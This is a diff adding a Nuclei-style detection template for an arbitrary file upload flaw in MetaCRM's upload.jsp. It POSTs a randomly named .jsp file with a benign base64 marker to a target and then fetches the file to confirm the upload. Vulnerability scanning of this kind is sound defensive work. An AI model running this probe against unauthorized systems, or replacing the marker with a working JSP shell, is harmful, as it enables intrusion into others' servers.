@@ -1,0 +1,77 @@
+id: metacrm-upload-jsp-anyfile-upload
+
+info:
+  name: MetaCRM Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template identifies an arbitrary file upload vulnerability in the MetaCRM system via the upload.jsp endpoint.
+
+variables:
+  t1: '{{rand_base(4)}}'
+  t2: '{{base64(t1)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/develop/systparam/softlogo/upload.jsp?key=null&form=null&field=null&filetitle=null&folder=null"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh
+    body: |-
+      ------WebKitFormBoundary0Mh3BfgWszxRFokh
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: text/plain
+
+      {{t2}}
+      ------WebKitFormBoundary0Mh3BfgWszxRFokh
+      Content-Disposition: form-data; name="key"
+
+      null
+      ------WebKitFormBoundary0Mh3BfgWszxRFokh
+      Content-Disposition: form-data; name="form"
+
+      null
+      ------WebKitFormBoundary0Mh3BfgWszxRFokh
+      Content-Disposition: form-data; name="field"
+
+      null
+      ------WebKitFormBoundary0Mh3BfgWszxRFokh
+      Content-Disposition: form-data; name="filetitile"
+
+      null
+      ------WebKitFormBoundary0Mh3BfgWszxRFokh
+      Content-Disposition: form-data; name="filefolder"
+
+      null
+      ------WebKitFormBoundary0Mh3BfgWszxRFokh--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "userfile"
+        part: body
+      - type: word
+        words:
+          - "value="
+        part: body
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/userfile/default/userlogo/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
